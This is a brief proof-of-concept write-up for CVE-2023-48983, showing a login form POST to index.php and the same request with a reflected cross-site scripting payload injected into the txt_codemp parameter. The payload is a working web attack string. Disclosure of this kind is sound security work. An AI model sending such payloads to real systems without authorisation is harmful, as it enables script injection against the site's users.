# CVE-2023-48983
POC CVE-2023-48983
## Request Post original for login index.php
```
sessao=f2928a10-95cf-4a6d-9e15-cb75721244fe&txt_tipo_acesso=0&aplEmp=zzz&txt_esqueci_senha=N&txt_conceitoNovoSenha=S&txt_codemp=01&txt_aux_codemp=&txt_tipo_login=1&txt_cpf_cnpj=&txt_apelido_TB=&txt_codusr=1&txt_senha=1&txt_codvend=999999&txt_cpf_cnpj_vend=&txt_senha_1=&txt_codemp_vend=00&txt_esqueci_cpfcnpj=&txt_esqueci_email=&txt_end_prgs=
```

## Resquest Post with payload for index.php
PARAMETER txt_codemp
```
sessao=f2928a10-95cf-4a6d-9e15-cb75721244fe&txt_tipo_acesso=0&aplEmp=zzz&txt_esqueci_senha=N&txt_conceitoNovoSenha=S&txt_codemp=01'"()%26%25<zzz><script>alert('tristao')</script>&txt_aux_codemp=&txt_tipo_login=1&txt_cpf_cnpj=&txt_apelido_TB=&txt_codusr=1&txt_senha=1&txt_codvend=999999&txt_cpf_cnpj_vend=&txt_senha_1=&txt_codemp_vend=00&txt_esqueci_cpfcnpj=&txt_esqueci_email=&txt_end_prgs=
```

![CVE-2023-48983](https://github.com/tristao-marinho/CVE-2023-48983/blob/main/Pasted%20image%2020240101095847.png?raw=true)



